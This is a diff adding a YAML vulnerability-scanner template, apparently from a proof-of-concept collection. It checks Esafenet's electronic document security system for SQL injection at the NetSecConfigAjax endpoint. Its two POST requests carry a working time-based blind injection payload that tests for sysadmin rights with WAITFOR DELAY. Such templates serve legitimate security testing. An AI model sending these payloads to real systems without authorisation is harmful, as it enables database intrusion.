@@ -1,0 +1,25 @@
+name: 亿赛通-电子文档安全管理系统-NetSecConfigAjax-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 7
+matchCount: 2
+rules:
+  - method: POST
+    path: /CDGServer3/NetSecConfigAjax;Service
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+    expression:
+      status: 200
+      sleep: 5
+  - method: POST
+    path: /CDGServer3/NetSecConfigAjax;Service
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:4'--
+    expression:
+      status: 200
+      sleep: 4
